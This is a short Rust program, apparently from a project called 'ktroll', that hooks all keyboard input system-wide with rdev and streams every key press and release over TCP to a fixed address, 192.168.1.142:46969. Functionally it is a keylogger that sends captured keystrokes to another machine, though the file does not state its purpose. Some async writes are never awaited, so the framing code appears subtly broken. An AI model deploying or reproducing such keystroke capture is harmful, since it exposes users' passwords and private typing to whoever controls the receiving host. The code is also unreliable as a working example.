use bincode;
use ktroll::KeyEvent;
use rdev::{Event, EventType, listen};
use tokio::{io::AsyncWriteExt, net::TcpStream, sync::mpsc};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let addr = "192.168.1.142:46969";
    let mut stream = TcpStream::connect(addr).await?;
    //
    let (tx, mut rx) = mpsc::channel::<KeyEvent>(256);

    tokio::spawn(async move {
        while let Some(ev) = rx.recv().await {
            let mut buf = [0u8; 100];
            let len =
                bincode::encode_into_slice(ev, &mut buf, bincode::config::standard()).unwrap(); 

            let buf = &buf[..len];

            let _ = stream.write_u32(len as u32);
            let _ = stream.write_all(buf).await;
            let _ = stream.flush();
        }
    });

    let callback = move |event: Event| {
        let key_event = match &event.event_type {
            EventType::KeyPress(key) => Some(KeyEvent {
                event_type: "KeyPress".to_string(),
                key: format!("{:?}", key),
            }),
            EventType::KeyRelease(key) => Some(KeyEvent {
                event_type: "KeyRelease".to_string(),
                key: format!("{:?}", key),
            }),
            _ => None,
        };

        if let Some(ev) = key_event {
            println!("{:?}", ev);
            let _ = tx.try_send(ev);
        }
    };
    if let Err(err) = listen(callback) {
        eprintln!("rdev error: {:?}", err);
    }

    Ok(())
}
